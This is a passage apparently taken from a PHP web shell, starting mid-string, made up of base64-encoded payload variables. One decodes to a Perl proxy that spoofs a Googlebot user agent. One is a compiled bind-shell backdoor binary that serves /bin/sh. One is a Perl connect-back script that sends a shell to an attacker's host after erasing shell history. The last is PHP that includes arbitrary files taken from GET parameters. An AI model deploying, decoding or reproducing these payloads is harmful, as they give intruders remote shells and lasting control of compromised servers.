ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$prx_pl="IyF1c3IvYmluL3BlcmwKdXNlIFNvY2tldDsKbXkgJHBvcnQgPSAkQVJHVlswXXx8MzEzMzc7Cm15ICRwcm90b2NvbCA9IGdldHByb3RvYn
luYW1lKCd0Y3AnKTsKbXkgJG15X2FkZHIgID0gc29ja2FkZHJfaW4gKCRwb3J0LCBJTkFERFJfQU5ZKTsKc29ja2V0IChTT0NLLCBBRl9JTkVULCBTT
0NLX1NUUkVBTSwgJHByb3RvY29sKSBvciBkaWUgInNvY2tldCgpOiAkISI7CnNldHNvY2tvcHQgKFNPQ0ssIFNPTF9TT0NLRVQsIFNPX1JFVVNFQURE
UiwxICkgb3IgZGllICJzZXRzb2Nrb3B0KCk6ICQhIjsKYmluZCAoU09DSywgJG15X2FkZHIpIG9yIGRpZSAiYmluZCgpOiAkISI7Cmxpc3RlbiAoU09
DSywgU09NQVhDT05OKSBvciBkaWUgImxpc3RlbigpOiAkISI7CiRTSUd7J0lOVCd9ID0gc3ViIHsKY2xvc2UgKFNPQ0spOwpleGl0Owp9Owp3aGlsZS
AoMSkgewpuZXh0IHVubGVzcyBteSAkcmVtb3RlX2FkZHIgPSBhY2NlcHQgKFNFU1NJT04sIFNPQ0spOwpteSAoJGZpc3QsICRtZXRob2QsICRyZW1vd
GVfaG9zdCwgJHJlbW90ZV9wb3J0KSA9IGFuYWx5emVfcmVxdWVzdCgpOwppZihvcGVuX2Nvbm5lY3Rpb24gKFJFTU9URSwgJHJlbW90ZV9ob3N0LCAk
cmVtb3RlX3BvcnQpID09IDApIHsKY2xvc2UgKFNFU1NJT04pOwpuZXh0Owp9CnByaW50IFJFTU9URSAkZmlyc3Q7CnByaW50IFJFTU9URSAiVXNlci1
BZ2VudDogR29vZ2xlYm90LzIuMSAoK2h0dHA6Ly93d3cuZ29vZ2xlLmNvbS9ib3QuaHRtbClcbiI7CndoaWxlICg8U0VTU0lPTj4pIHsKbmV4dCBpZi
AoL1Byb3h5LUNvbm5lY3Rpb246LyB8fCAvVXNlci1BZ2VudDovKTsKcHJpbnQgUkVNT1RFICRfOwpsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvK
TsKfQpwcmludCBSRU1PVEUgIlxuIjsKJGhlYWRlciA9IDE7CndoaWxlICg8UkVNT1RFPikgewpwcmludCBTRVNTSU9OICRfOwppZiAoJGhlYWRlcikg
eyAgICAgCmlmICgkaGVhZGVyICYmICRfID1+IC9eW1xzXHgwMF0qJC8pIHsKJGhlYWRlciA9IDA7Cn0KfQp9CmNsb3NlIChSRU1PVEUpOwpjbG9zZSA
oU0VTU0lPTik7Cn0KY2xvc2UgKFNPQ0spOwpzdWIgYW5hbHl6ZV9yZXF1ZXN0IHsKbXkgKCRmaXN0LCAkdXJsLCAkcmVtb3RlX2hvc3QsICRyZW1vdG
VfcG9ydCwgJG1ldGhvZCk7CiRmaXJzdCA9IDxTRVNTSU9OPjsKJHVybCA9ICgkZmlyc3QgPX4gbXwoaHR0cDovL1xTKyl8KVswXTsKKCRtZXRob2QsI
CRyZW1vdGVfaG9zdCwgJHJlbW90ZV9wb3J0KSA9IAooJGZpcnN0ID1+IG0hKEdFVCkgaHR0cDovLyhbXi86XSspOj8oXGQqKSEgKTsKaWYgKCEkcmVt
b3RlX2hvc3QpIHsKY2xvc2UoU0VTU0lPTik7CmV4aXQ7Cn0KJHJlbW90ZV9wb3J0ID0gImh0dHAiIHVubGVzcyAoJHJlbW90ZV9wb3J0KTsKJGZpcnN
0ID1+IHMvaHR0cDpcL1wvW15cL10rLy87CnJldHVybiAoJGZpcnN0LCAkbWV0aG9kLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7Cn0Kc3ViIG
9wZW5fY29ubmVjdGlvbiB7Cm15ICgkaG9zdCwgJHBvcnQpID0gQF9bMSwyXTsKbXkgKCRkZXN0X2FkZHIsICRjdXIpOwppZiAoJHBvcnQgIX4gL15cZ
CskLykgewokcG9ydCA9IChnZXRzZXJ2YnluYW1lKCRwb3J0LCAidGNwIikpWzJdOwokcG9ydCA9IDgwIHVubGVzcyAoJHBvcnQpOwp9CiRob3N0ID0g
aW5ldF9hdG9uICgkaG9zdCkgb3IgcmV0dXJuIDA7CiRkZXN0X2FkZHIgPSBzb2NrYWRkcl9pbiAoJHBvcnQsICRob3N0KTsKc29ja2V0ICgkX1swXSw
gQUZfSU5FVCwgU09DS19TVFJFQU0sICRwcm90b2NvbCkgb3IgZGllICJzb2NrZXQoKSA6ICQhIjsKY29ubmVjdCAoJF9bMF0sICRkZXN0X2FkZHIpIG
9yIHJldHVybiAwOwokY3VyID0gc2VsZWN0KCRfWzBdKTsgIAokfCA9IDE7CnNlbGVjdCgkY3VyKTsKcmV0dXJuIDE7Cn0=";
$port_bind_bd_cs="f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVYnlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAA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L2NydG4uUwAxLmMAX0RZTkFNSUMAX19maW5pX2FycmF5X2VuZABfX2ZpbmlfYXJyYXlfc3RhcnQAX19pbml0X2FycmF5X2VuZABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A";
$back_connects="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KaWYgKCEkQVJHVlswXSkgew0KICBwcmludGYgIlVzYWdlOiAkMCBbSG9zdF0gPFBvcnQ+XG4iOw0KICBleGl0KDEpOw0KfQ0KcHJpbnQgIlsqXSBEdW1waW5nIEFyZ3VtZW50c1xuIjsNCiRob3N0ID0gJEFSR1ZbMF07DQokcG9ydCA9IDgwOw0KaWYgKCRBUkdWWzFdKSB7DQogICRwb3J0ID0gJEFSR1ZbMV07DQp9DQpwcmludCAiWypdIENvbm5lY3RpbmcuLi5cbiI7DQokcHJvdG8gPSBnZXRwcm90b2J5bmFtZSgndGNwJykgfHwgZGllKCJVbmtub3duIFByb3RvY29sXG4iKTsNCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAoIlNvY2tldCBFcnJvclxuIik7DQpteSAkdGFyZ2V0ID0gaW5ldF9hdG9uKCRob3N0KTsNCmlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRwb3J0LCAkdGFyZ2V0KSkgew0KICBkaWUoIlVuYWJsZSB0byBDb25uZWN0XG4iKTsNCn0NCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGxcbiI7DQppZiAoIWZvcmsoICkpIHsNCiAgb3BlbihTVERJTiwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERPVVQsIj4mU0VSVkVSIik7DQogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOw0KICBwcmludCAiLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciB2cyAxLjAgYnkgU25JcEVyX1NBIHNuaXBlci1zYS5jb20gPT0tLSAgXG5cbiI7IA0Kc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1QgO2VjaG8gLS09PVN5c3RlbWluZm89PS0tIDsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLSA7IGlkO2VjaG87ZWNobyAtLT09RGlyZWN0b3J5PT0tLSA7IHB3ZDtlY2hvOyBlY2hvIC0tPT1TaGVsbD09LS0gIik7IA0KICBleGVjIHsnL2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDsNCiAgZXhpdCgwKTsNCn0=";
$egy_ini="PD8NCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZWd5Il0pOw0KPz4=";
